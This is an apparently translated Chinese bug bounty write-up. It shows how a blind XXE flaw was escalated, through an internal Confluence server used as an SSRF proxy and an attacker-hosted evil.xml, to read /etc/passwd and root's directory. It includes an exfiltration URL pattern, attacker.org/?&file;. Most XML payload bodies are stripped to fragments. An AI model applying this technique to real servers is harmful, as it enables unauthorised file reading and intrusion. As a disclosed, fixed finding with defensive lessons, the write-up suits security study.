周末精神焕发地回来后，我下定决心要找出这个脆弱点可能造成的影响。具体来说，如果我可以在内部网络上找到一个类似代理的主机，未经过滤的内部网络流量可能被滥用将流量路由到外部。
通常，在没有任何形式的可读反馈的情况下，在web应用程序上发现漏洞几乎是不可能的。幸运的是，在[Jira中存在一个已知的SSRF漏洞](https://ecosystem.atlassian.net/browse/OAUTH-344
"Jira中存在一个已知的SSRF漏洞")，这已经在[许多文章中](https://medium.com/bugbountywriteup/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a
"许多文章中")得到了证明。
我立即去测试我的运气与内部的Jira服务器
请求：
     %ext;
    ]>
响应：
    The request is invalid: The request content was malformed:
    sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target
`HTTPS` 的流量失败了，如果 `SSL` 验证出错的话。幸运的是，`Jira` 默认在`8080`端口上运行`HTTP`服务。
请求：
     %ext;
    ]>
响应：
    The request is invalid: The request content was malformed:
    http://jira.company.internal:8080/plugins/servlet/oauth/users/icon-uri
我又检查了一下`Burp Collaborator`
的交互信息，但运气不佳。`Jira`实例可能已经打了补丁，或者已经禁用了易受攻击的插件。于是，我疯狂而徒劳地寻找不同类型的`Wiki`应用程序上已知的`SSRF`漏洞之后(并不是最优选择)，我决定测试内部`Confluence`实例是否存在相同的`Jira`
漏洞(默认情况下运行在端口8090上)。
请求：
     %ext;
    ]>
响应：
    The request is invalid: The request content was malformed:
    The markup declarations contained or pointed to by the document type declaration must be well-formed.
发现
我们成功地通过一个内部易受攻击的`Confluence`来绕过防火墙限制出站的`internet`流量。这意味着我们现在可以尝试`XXE`的经典方法。让我们从托管一个`evil.xml`文件开始。攻击者服务器托管`evil.xml`，包含以下内容，希望触发有趣的错误消息:
    ">
让我们更详细地看看这些参数实体的定义:
  1. 将外部引用(在本例中是系统的/目录)的内容加载到变量中(%file)
  2. 定义一个变量(%ent);它实际上只是将各个部分链接在一起来解释第三个实体
  3. 尝试在（%file）位置访问资源;(无论它指向何处)并将该位置中的任何内容加载到实体（data）中。
注意，我们希望第三个定义失败，因为`（%file）`的内容;不会指向有效的资源位置，而是包含完整目录的内容。
现在，使用`Confluence`（`proxy`）指向我们的恶意文件，并确保参数`（%ent）`; 实体参数`(&data；)`被访问以触发目录访问:
请求：
    %ext;
    %ent;
    ]>
    &data;
响应
    no protocol: bin
    boot
    dev
    etc
    home
    [...]
太棒了!列出了服务器的目录内容!
有趣的是，这显示了从服务器返回基于错误的输出的另一种方法，即指定一个“丢失的”协议，而不是我们前面看到的无效协议。
这可以帮助我们解决在读取包含冒号的文件时遇到的最后一个难点，因为使用上述方法读取`/etc/passwd`会导致以下错误:
请求：
    %ext;
    %ent;
    ]>
    &data;
响应：
    unknown protocol: root
换句话说，在冒号`:`第一次出现之前，可以读取文件，但是读取冒号之后不能再读取了。绕过这一点并强制在错误消息中显示完整的文件内容的一种方法是在文件内容之前加上一个冒号。这将导致`no
protocol`错误，因为第一个冒号之前的字段将是空的，即未定义。托管的 `evil.xml` 修改为:
    ">
请求：
    %ext;
    %ent;
    ]>
    &data;
响应：
    no protocol: :root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    […]
Java 在访问目录时还会返回目录列表，于是尝试访问根目录文件。
evil.xml
    ">
请求：
    %ext;
    %ent;
    ]>
    &data;
响应：
    no protocol: :.bash_history
    .bash_logout
    .bash_profile
    .bashrc
    .pki
    .ssh
    [...]
就是这样，看来我们很幸运。通过滥用不充分的网络分隔、未打补丁的内部应用程序服务器、过度特权的web服务器以及通过过于冗长的错误消息传递导致的信息泄漏，我们成功地将一个`blind
XXE`漏洞提升为读取`root`目录和文件的漏洞。
## 经验
红队：
  1. 如果有东西看起来很奇怪，那么继续挖掘
  2. `Java SAX`解析器对`URL`模式的有趣处理允许使用一些新的方法提取信息。虽然现代`Java`版本不允许将多行文件作为外部HTTP请求(即`[attacker.org/?&file;](http://attacker.org/?&file;)`)的方式导出，但是在错误消息中，甚至在`URL`协议中，都可以获得多行响应
蓝队：
  1. 确保内部服务器和面向公众的服务器一样得到了及时的修补
  2. 不要把内部网络视为一个受信任的安全区，而应采用适当的网络分隔
  3. 将详细的错误消息写入错误日志，而不是HTTP响应
  4. 依赖身份验证并不一定能缓解诸如XXE之类的低级问题
## 时间线：
1.20181126-第一次注意到有趣的XML端点  
2.20181128-blind XXE报告:可以列举文件、目录、内部网络位置和开放端口  
3.20181203-发现易受攻击的内部Confluence服务器，报告POC演示了读取根目录文件的能力  
4.20181204-漏洞修复获得奖金  
5.20181206-申请发表文章;  
6.20181212-批准。